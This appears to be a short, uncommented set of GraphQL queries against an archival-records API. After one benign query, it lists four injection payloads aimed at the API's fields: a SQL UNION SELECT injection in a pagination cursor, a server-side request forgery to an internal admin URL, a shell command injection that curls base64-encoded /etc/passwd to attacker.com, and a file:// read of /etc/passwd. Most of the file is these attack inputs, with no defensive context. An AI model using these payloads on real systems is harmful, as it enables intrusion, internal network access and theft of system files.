query {
  repositories(first: 5) {
    items {
      id
      type
      itemCount
      country {
        name
      }
    }
  }
}

query {
  repositories(after: "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--") {
    items {
      id
      type
    }
  }
}

query {
  repositories {
    items {
      country {
        addresses {
          webpage(url: "http://internal-service.internal/admin")
        }
      }
    }
  }
}

query {
  repositories(from: "; curl http://attacker.com/$(cat /etc/passwd | base64)") {
    items {
      id
    }
  }
}

query {
  repositories {
    items {
      documentaryUnits {
        items {
          descriptions {
            sources(source: "file:///etc/passwd")
          }
        }
      }
    }
  }
}

